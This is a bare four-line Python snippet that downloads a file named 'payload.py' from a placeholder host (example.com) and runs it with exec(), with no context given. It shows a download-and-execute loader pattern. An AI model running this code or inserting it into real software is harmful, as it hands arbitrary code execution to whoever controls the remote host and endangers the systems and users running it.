import requests

code = requests.get("https://example.com/payload.py").text
exec(code)
